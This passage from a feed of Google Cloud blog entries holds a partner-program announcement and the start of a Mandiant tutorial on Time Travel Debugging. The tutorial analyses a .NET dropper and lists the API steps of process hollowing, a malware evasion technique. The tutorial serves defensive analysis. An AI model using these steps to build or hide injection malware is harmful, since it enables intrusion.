        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/identity-security/announcing-the-google-unified-security-recommended-program/",
        "title": "An open approach to security: Announcing Google Unified Security Recommended",
        "thumbnail": null,
        "author": "McCall McIntyre",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At Google Cloud, we believe that being at the forefront of driving secure innovation and meeting the evolving needs of customers includes working with partners. The reality is that the security landscape should be interoperable, and your security tools should be able to integrate with each other. </span></p>\n<p><a href=\"https://cloud.google.com/security/google-unified-security?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Unified Security</span></a><span style=\"vertical-align: baseline;\">, our AI-powered, converged security solution, has been designed to support greater customer choice. To further this vision, today we’re announcing </span><strong style=\"vertical-align: baseline;\">Google Unified Security Recommended</strong><span style=\"vertical-align: baseline;\">, a new program that expands strategic partnerships with market-leading security solutions trusted by our customers. </span></p>\n<p><span style=\"vertical-align: baseline;\">We welcome </span><a href=\"https://www.crowdstrike.com/en-us/press-releases/crowdstrike-named-inaugural-google-unified-security-recommended-partner/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Crowdstrike</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.fortinet.com/blog/unified-sase/fortinet-named-inaugural-google-unified-security-recommended-partner-for-network-protection-powered-by-fortisase-and-security-fabric\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Fortinet</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://wiz.io/blog/wiz-google-unified-security-recommended-program\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Wiz</span></a><span style=\"vertical-align: baseline;\"> as inaugural Google Unified Security Recommended partners. These integrations are designed to meet our customers where they are today and ensure their end-to-end deployments are built to scale with Google in the future.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1- GUS Rec Blog Image\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1-_GUS_Rec_Blog_Image.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Google Unified Security and our Recommended program partner solutions.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Building confidence through validated integrations</strong></h3>\n<p><span style=\"vertical-align: baseline;\">As part of the Google Unified Security Recommended program, partners agree to adhere to comprehensive technical integration across Google’s security product portfolio; a collaborative, customer-first support model that reflects our intent to collectively protect our customers; and invest jointly in AI innovation. This program offers our customers:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Enhanced confidence</strong><span style=\"vertical-align: baseline;\">: Select partner products that have undergone evaluation and validation to ensure optimal integration with Google Unified Security.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Accelerated discovery</strong><span style=\"vertical-align: baseline;\">: Streamline your evaluation process with a carefully curated selection of market-leading solutions addressing specific enterprise challenges.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Prioritize outcomes</strong><span style=\"vertical-align: baseline;\">: Minimize integration overhead, allowing your team to allocate resources towards building security solutions that deliver business outcomes.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">We’re working to ensure that customers can use solutions that are powerful today — and designed for future advancements. Learn more about the product-level requirements that define the Google Unified Security Recommended designation </span><a href=\"https://docs.cloud.google.com/chronicle/docs/reference/google-unified-security-recommended\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Our inaugural partners: Unifying your defenses</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Our collaborations with </span><a href=\"https://services.google.com/fh/files/blogs/gus_recommended_crowdstrike.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CrowdStrike</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://services.google.com/fh/files/blogs/gus_recommended_fortinet_v2.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Fortinet</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://services.google.com/fh/files/blogs/gus_recommended_wiz.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Wiz</span></a><span style=\"vertical-align: baseline;\"> exemplify our \"better together\" philosophy by addressing tangible security challenges.</span></p>\n<p><strong style=\"vertical-align: baseline;\">CrowdStrike Falcon (endpoint protection)</strong><span style=\"vertical-align: baseline;\">: Integrations between the AI-native CrowdStrike Falcon® platform, Google Security Operations, Google Threat Intelligence, and Mandiant Threat Defense can enable customers to detect, investigate, and respond to threats faster across hybrid and multicloud environments. </span></p>\n<p><span style=\"vertical-align: baseline;\">Customers can use Falcon Endpoint risk signals to define Context-Aware access policies enforced by Google Chrome Enterprise. The collaboration also supports integrations that secure the AI lifecycle — and extends through the model context protocol (MCP) to advance AI for security operations. Together, CrowdStrike and Google Cloud deliver unified protection across endpoint, identity, cloud, and data.</span></p>\n<p><span style=\"vertical-align: baseline;\">“CrowdStrike and Google Cloud share a vision for an open, AI-powered future of security. Together, we’re uniting our leading AI-native platforms – Google Security Operations and the CrowdStrike Falcon® platform – to help customers harness the power of generative AI and stay ahead of modern threats,” said Daniel Bernard, chief business officer, CrowdStrike.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Fortinet cloud-delivered SASE and Next-Generation Firewall (network protection)</strong><span style=\"vertical-align: baseline;\">: Integrating Fortinet’s Security Fabric with Google Security Operations combines AI-driven FortiGuard Threat Intelligence with rich network and web telemetry to deliver unified visibility and control across users, applications, and network edges. </span></p>\n<p><span style=\"vertical-align: baseline;\">Customers can integrate FortiSASE and FortiGate solutions into Google Security Operations to correlate activity across their environments, apply advanced detections, and automate coordinated response actions that contain threats in near real-time. This collaboration can help reduce complexity, streamline operations, and strengthen protection across hybrid infrastructures.</span></p>\n<p><span style=\"vertical-align: baseline;\">“Customers are demanding simplified security architectures that reduce complexity and strengthen protection,” said Nirav Shah, senior vice president, Product and Solutions, Fortinet. “As an inaugural partner in the Google Cloud Unified Security Recommended program, we are combining the power of FortiSASE and the Fortinet Security Fabric with Google Cloud’s security capabilities to converge networking and security across environments. This approach gives SecOps and NetOps shared visibility and coordinated controls, helping teams eliminate tool sprawl, streamline operations, and accelerate secure digital transformation.”</span></p>\n<p><strong style=\"vertical-align: baseline;\">Wiz (multicloud CNAPP)</strong><span style=\"vertical-align: baseline;\">: Customers can integrate Wiz's cloud security findings with Google Security Operations to help teams identify, prioritize, and address their most critical cloud risks in a unified platform. </span></p>\n<p><span style=\"vertical-align: baseline;\">In addition, Wiz and Security Command Center integrate to provide complete visibility and security for Google Cloud environments, including threat detection, AI security, and in-console security for application owners. Wiz is actively developing a new Google Threat Intelligence (GTI) integration that allows existing GTI customers to access threat intelligence seamlessly in the Wiz console, enabling threat intelligence-driven detection and response processes.</span></p>\n<p><span style=\"vertical-align: baseline;\">“Achieving secure innovation in the cloud requires unified visibility and radical risk prioritization. Our inclusion in the Google Unified Security Recommended program recognizes the power of Wiz to deliver code-to-cloud security for Google Cloud customers. By integrating our platform with Google Security Operations and Security Command Center, we enable customers to see their multicloud attack surface, prioritize the most critical risks, and automatically accelerate remediation. Together, we are simplifying the most complex cloud security challenges and making it easier for you to innovate securely,\" said Anthony Belfiore, chief strategy officer, Wiz.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Powering the agentic SOC with MCP</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A critical aspect of Google Unified Security Recommended is our shared dedication to strategic AI initiatives, including MCP support. Because it enables AI models to interact with and use security tools, MCP can enhance security workflows by ensuring Gemini models possess contextual awareness across multiple downstream services.</span></p>\n<p><span style=\"vertical-align: baseline;\">MCP can help facilitate an enhanced, cross-platform </span><strong style=\"vertical-align: baseline;\">agentic experience</strong><span style=\"vertical-align: baseline;\">. With MCP, our new AI agents — such as the alert triage agent in Google Security Operations that autonomously investigates alerts — can query partner tools for telemetry, enrich investigations with third-party data, and orchestrate response actions across your entire security stack. </span></p>\n<p><span style=\"vertical-align: baseline;\">We are proud to confirm that all of our inaugural launch partners support MCP and have developed recommended approaches for how to activate MCP-supported agentic workflows across our products, a crucial step towards realizing our vision of an </span><a href=\"https://cloud.google.com/blog/products/identity-security/introducing-the-agentic-soc-workshops-for-security-professionals\"><span style=\"text-decoration: underline; vertical-align: baseline;\">agentic SOC</span></a><span style=\"vertical-align: baseline;\"> where AI functions as a virtual security assistant, proactively identifying threats and guiding you to faster, more effective responses.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Our open future on Google Cloud Marketplace</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The introduction of the Google Unified Security Recommended program is only the beginning. We are dedicated to expanding this program to include a wider array of the </span><strong style=\"vertical-align: baseline;\">most trusted partner solutions</strong><span style=\"vertical-align: baseline;\"> with substantial investment across the Google Unified Security product suite, helping our customers build a more scalable, effective, and interoperable security architecture.</span></p>\n<p><span style=\"vertical-align: baseline;\">For simplified procurement and deployment, all qualified Google Unified Security Recommended solutions are available in the </span><a href=\"https://cloud.google.com/marketplace?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Marketplace</span></a><span style=\"vertical-align: baseline;\">. We offer Google Unified Security and Google Cloud customers streamlined purchasing of third-party offerings, all consolidated into one Google Cloud bill.</span></p>\n<p><span style=\"vertical-align: baseline;\">To learn more about the program and explore Google-validated solutions from our partners, visit the </span><a href=\"https://docs.cloud.google.com/chronicle/docs/reference/google-unified-security-recommended\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Unified Security Recommended page</span></a><span style=\"vertical-align: baseline;\">. Tech partners interested in program consideration are encouraged to </span><a href=\"https://forms.gle/qffq4oRQ9rpQ9Pp28\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">reach out</span></a><span style=\"vertical-align: baseline;\"> for guidance.</span></p></div>",
        "published_date": "2025-11-13 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/threat-intelligence/time-travel-debugging-using-net-process-hollowing/",
        "title": "Time Travel Triage: An Introduction to Time Travel Debugging using a .NET Process Hollowing Case Study",
        "thumbnail": null,
        "author": "Mandiant",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p>Written by: Josh Stroschein, Jae Young Kim</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The prevalence of obfuscation and multi-stage layering in today’s malware often forces analysts into tedious and manual debugging sessions. For instance, the primary challenge of analyzing pervasive commodity stealers like AgentTesla isn’t identifying the malware, but quickly cutting through the obfuscated delivery chain to get to the final payload.</span></p>\n<p><span style=\"vertical-align: baseline;\">Unlike traditional live debugging, </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/ttd-instruction-emulation-bugs\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Time Travel Debugging (TTD)</span></a><span style=\"vertical-align: baseline;\"> captures a deterministic, shareable record of a program's execution. Leveraging TTD's powerful data model and time travel capabilities allow us to efficiently pivot to the key execution events that lead to the final payload.</span></p>\n<p><span style=\"vertical-align: baseline;\">This post introduces all of the basics of WinDbg and TTD necessary to start incorporating TTD into your analysis. We demonstrate why it deserves to be a part of your toolkit by walking through an obfuscated multi-stage .NET dropper that performs process hollowing.</span></p>\n<h3><span style=\"vertical-align: baseline;\">What is Time Travel Debugging?</span></h3>\n<p><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-overview\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Time Travel Debugging (TTD)</span></a><span style=\"vertical-align: baseline;\">, a technology offered by Microsoft as part of </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">WinDbg</span></a><span style=\"vertical-align: baseline;\">, records a process’s execution into a trace file that can be replayed forwards and backwards. The ability to quickly rewind and replay execution reduces analysis time by eliminating the need to constantly restart debugging sessions or restore virtual machine snapshots. TTD also enables users to query the recorded execution data and filter it with Language Integrated Query (LINQ) to find specific events of interest like module loads or calls to APIs that implement malware functionalities like shellcode execution or process injection.</span></p>\n<p><span style=\"vertical-align: baseline;\">During recording, TTD acts as a transparent layer that allows full interaction with the operating system. A trace file preserves a complete execution record that can be shared with colleagues to facilitate collaboration, circumventing environmental differences that can affect the results of live debugging.</span></p>\n<p><span style=\"vertical-align: baseline;\">While TTD offers significant advantages, users should be aware of certain limitations. Currently, TTD is restricted to user-mode processes and cannot be used for kernel-mode debugging. The trace files generated by TTD have a proprietary format, meaning their analysis is largely tied to WinDbg. Finally, TTD does not offer \"true\" time travel in the sense of altering the program's past execution flow; if you wish to change a condition or variable and see a different outcome, you must capture an entirely new trace as the existing trace is a fixed recording of what occurred.</span></p>\n<h4><span style=\"vertical-align: baseline;\">A Multi-Stage .NET Dropper with Signs of Process Hollowing</span></h4>\n<p><span style=\"vertical-align: baseline;\">The Microsoft .NET framework has long been popular among threat actors for developing highly obfuscated malware. These programs often use code flattening, encryption, and multi-stage assemblies to complicate the analysis process. This complexity is amplified by </span><a href=\"https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Platform Invoke (P/Invoke)</span></a><span style=\"vertical-align: baseline;\">, which gives managed .NET code direct access to the unmanaged Windows API, allowing authors to port tried-and-true evasion techniques like </span><a href=\"https://attack.mitre.org/techniques/T1055/012/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">process hollowing</span></a><span style=\"vertical-align: baseline;\"> into their code.</span></p>\n<p><span style=\"vertical-align: baseline;\">Process hollowing is a pervasive and effective form of code injection where malicious code runs under the guise of another process. It is common at the end of downloader chains because the technique allows injected code to assume the legitimacy of a benign process, making it difficult to spot the malware with basic monitoring tools.</span></p>\n<p><span style=\"vertical-align: baseline;\">In this case study, we'll use TTD to analyze a .NET dropper that executes its final stage via process hollowing. The case study demonstrates how TTD facilitates highly efficient analysis by quickly surfacing the relevant Windows API functions, enabling us to bypass the numerous layers of .NET obfuscation and pinpoint the payload.</span></p>\n<p><span style=\"vertical-align: baseline;\">Basic analysis is a vital first step that can often identify potential process hollowing activity. For instance, using a sandbox may reveal suspicious process launches. Malware authors frequently target legitimate .NET binaries for hollowing as these blend seamlessly with normal system operations. In this case, reviewing process activity on </span><a href=\"https://www.virustotal.com/gui/file/b7268f9814ddac66d6a4c1c43115d19de4fdb23e4d30ae233aeb51127213a1df/behavior\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">VirusTotal</span></a><span style=\"vertical-align: baseline;\"> shows that the sample launches </span><code style=\"vertical-align: baseline;\">InstallUtil.exe</code><span style=\"vertical-align: baseline;\"> (found in </span><code style=\"vertical-align: baseline;\">%windir%\\Microsoft.NET\\Framework\\&lt;version&gt;\\</code><span style=\"vertical-align: baseline;\">). While </span><code style=\"vertical-align: baseline;\">InstallUtil.exe</code><span style=\"vertical-align: baseline;\"> is a legitimate utility, its execution as a child process of a suspected malicious sample is an indicator that helps focus our initial investigation on potential process injection.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Process activity recorded in the VirusTotal sandbox\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/time-travel-triage-fig1a.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Process activity recorded in the VirusTotal sandbox</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Despite newer, more stealthy techniques, such as Process Doppelgänging, when an attacker employs process injection, it’s still often the classic version of process hollowing due to its reliability, relative simplicity, and the fact that it still effectively evades less sophisticated security solutions. The classic process hollowing steps are as follows:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">CreateProcess</code><span style=\"vertical-align: baseline;\"> (with the </span><code style=\"vertical-align: baseline;\">CREATE_SUSPENDED</code><span style=\"vertical-align: baseline;\"> flag): Launches the victim process (</span><code style=\"vertical-align: baseline;\">InstallUtil.exe</code><span style=\"vertical-align: baseline;\">) but suspends its primary thread before execution.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">ZwUnmapViewOfSection</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">NtUnmapViewOfSection</code><span style=\"vertical-align: baseline;\">: \"Hollows out\" the process by removing the original, legitimate code from memory.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">VirtualAllocEx</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">WriteProcessMemory</code><span style=\"vertical-align: baseline;\">: Allocates new memory in the remote process and injects the malicious payload.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">GetThreadContext</code><span style=\"vertical-align: baseline;\">: Retrieves the context (the state and register values) of the suspended primary thread.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">SetThreadContext</code><span style=\"vertical-align: baseline;\">: Redirects the execution flow by modifying the entry point register within the retrieved context to point to the address of the newly injected malicious code.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">ResumeThread</code><span style=\"vertical-align: baseline;\">: Resumes the thread, causing the malicious code to execute as if it were the legitimate process.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">To confirm this activity in our sample using TTD, we focus our search on the process creation and the subsequent writes to the child process’s address space. The approach demonstrated in this search can be adapted to triage other techniques by adjusting the TTD queries to search for the APIs relevant to that technique.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Recording a Time Travel Trace of the Malware</span></h4>\n<p><span style=\"vertical-align: baseline;\">To begin using TTD, you must first record a trace of a program's execution. There are two primary ways to record a trace: using the WinDbg UI or the command-line utilities provided by Microsoft. The command-line utilities offer the quickest and most customizable way to record a trace, and that is what we'll explore in this post.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Warning</strong><span style=\"vertical-align: baseline;\">: Take all usual precautions for performing dynamic analysis of malware when recording a TTD trace of malware executables. TTD recording is not a sandbox technology and allows the malware to interface with the host and the environment without obstruction.</span></p>\n<p><code style=\"vertical-align: baseline;\">TTD.exe</code><span style=\"vertical-align: baseline;\"> is the preferred command-line tool for recording traces. While Windows includes a built-in utility (</span><code style=\"vertical-align: baseline;\">tttracer.exe</code><span style=\"vertical-align: baseline;\">), that version has reduced features and is primarily intended for system diagnostics, not general use or automation. Not all WinDbg installations provide the </span><code style=\"vertical-align: baseline;\">TTD.exe</code><span style=\"vertical-align: baseline;\"> utility or add it to the system path. The quickest way to get </span><code style=\"vertical-align: baseline;\">TTD.exe</code><span style=\"vertical-align: baseline;\"> is to use the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-ttd-exe-command-line-util\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">stand-alone installer</span></a><span style=\"vertical-align: baseline;\"> provided by Microsoft. This installer automatically adds </span><code style=\"vertical-align: baseline;\">TTD.exe</code><span style=\"vertical-align: baseline;\"> to the system's </span><code style=\"vertical-align: baseline;\">PATH</code><span style=\"vertical-align: baseline;\"> environment variable, ensuring it's available from a command prompt. To see its usage information, run </span><code style=\"vertical-align: baseline;\">TTD.exe -help</code><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">The quickest way to record a trace is to simply provide the command line invoking the target executable with the appropriate arguments. We use the following command to record a trace of our sample:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>C:\\Users\\FLARE\\Desktop\\&gt; ttd.exe 0b631f91f02ca9cffd66e7c64ee11a4b.bin\nMicrosoft (R) TTD 1.01.11 x64\nRelease: 1.11.532.0\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nLaunching '0b631f91f02ca9cffd66e7c64ee11a4b.bin'\n    Initializing the recording of process (PID:2448) on trace file: C:\\Users\\FLARE\\Desktop\\0b631f91f02ca9cffd66e7c64ee11a4b02.run\n    Recording has started of process (PID:2448) on trace file: C:\\Users\\FLARE\\Desktop\\0b631f91f02ca9cffd66e7c64ee11a4b02.run</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Once TTD begins recording, the trace concludes in one of two ways. First, the tracing automatically stops upon the malware's termination (e.g., process exit, unhandled exception, etc.). Second, the user can manually intervene. While recording, </span><code style=\"vertical-align: baseline;\">TTD.exe</code><span style=\"vertical-align: baseline;\"> displays a small dialog (shown in figure 2) with two control options:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Tracing Off:</strong><span style=\"vertical-align: baseline;\"> Stops the trace and detaches from the process, allowing the program to continue execution.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Exit App:</strong><span style=\"vertical-align: baseline;\"> Stops the trace and also terminates the process.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--small\n      \n      \n        h-c-grid__col\n        \n        \n        h-c-grid__col--2 h-c-grid__col--offset-5\n      \">\n\n      \n      \n        \n        <img alt=\"TTD trace execution control dialog\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/time-travel-triage-fig2a.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: TTD trace execution control dialog</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Recording a TTD trace produces the following files:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">&lt;trace&gt;.run</code><span style=\"vertical-align: baseline;\">: The trace file is a proprietary format that contains compressed execution data. The size of a trace file is influenced by the size of the program, the length of execution, and other external factors such as the number of additional resources that are loaded.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">&lt;trace&gt;.idx</code><span style=\"vertical-align: baseline;\">: The index file allows the debugger to quickly locate specific points in time during the trace, bypassing sequential scans of the entire trace. The index file is created automatically the first time a trace file is opened in WinDbg. In general, </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-trace-file-information\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Microsoft</span></a><span style=\"vertical-align: baseline;\"> suggests that index files are typically twice the size of the trace file.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">&lt;trace&gt;.out</code><span style=\"vertical-align: baseline;\">: The trace log file containing logs produced during trace recording.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Once a trace is complete, the </span><code style=\"vertical-align: baseline;\">.run</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">file can be opened with WinDbg.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Triaging the TTD Trace: Shifting Focus to Data</span></h3>\n<p><span style=\"vertical-align: baseline;\">The fundamental advantage of TTD is the ability to shift focus from manual code stepping to execution data analysis. Performing rapid, effective triage with this data-driven approach requires proficiency in both basic TTD navigation and querying the Debugger Data Model. Let's begin by exploring the basics of navigation and the Debugger Data Model.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Navigating a Trace</span></h4>\n<p><span style=\"vertical-align: baseline;\">Basic navigation commands are available under the Home tab in the WinDbg UI.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Basic WinDbg TTD Navigation Commands\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/time-travel-triage-fig3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: Basic WinDbg TTD Navigation Commands</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The standard WinDbg commands and shortcuts for controlling execution are:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">g</code><span style=\"vertical-align: baseline;\">: </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/g--go-\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Go</span></a><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">F5</code><span style=\"vertical-align: baseline;\">) – </span><span style=\"vertical-align: baseline;\">Resume execution</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">gu</code><span style=\"vertical-align: baseline;\">: </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/gu--go-up-\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Go Up / Step Out</span></a><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">Shift+F11</code><span style=\"vertical-align: baseline;\">) – </span><span style=\"vertical-align: baseline;\">Execute until current function is complete</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">t</code><span style=\"vertical-align: baseline;\">: </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/t--trace-\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Trace / Step Into</span></a><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">F11</code><span style=\"vertical-align: baseline;\"> or </span><code style=\"vertical-align: baseline;\">F8</code><span style=\"vertical-align: baseline;\">)</span><span style=\"vertical-align: baseline;\"> – Single step into</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">p</code><span style=\"vertical-align: baseline;\">: </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/p--step-\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Step / Step Over</span></a><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">F10</code><span style=\"vertical-align: baseline;\">) –</span><span style=\"vertical-align: baseline;\"> Single step over</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Replaying a TTD trace enables the reverse flow control commands that complement the regular flow control commands. Each reverse flow control complement is formed by appending a dash (</span><span style=\"vertical-align: baseline;\">-</span><span style=\"vertical-align: baseline;\">) to the regular flow control command:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">g-</code><span style=\"vertical-align: baseline;\">: Go Back – Execute the trace backwards</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">g-u</code><span style=\"vertical-align: baseline;\">: </span><span style=\"vertical-align: baseline;\">Step Out Back - Execute the trace backwards up to the last call instruction</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">t-</code><span style=\"vertical-align: baseline;\">:</span><span style=\"vertical-align: baseline;\"> Step Into Back – Single step into backwards</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">p-</code><span style=\"vertical-align: baseline;\">: Step Over Back – Single step over backwards</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">Time Travel (</span><code style=\"vertical-align: baseline;\">!tt</code><span style=\"vertical-align: baseline;\">) Command</span></h4>\n<p><span style=\"vertical-align: baseline;\">While basic navigation commands let you move step-by-step through a trace, the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/time-travel-debugging-extension-tt\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; 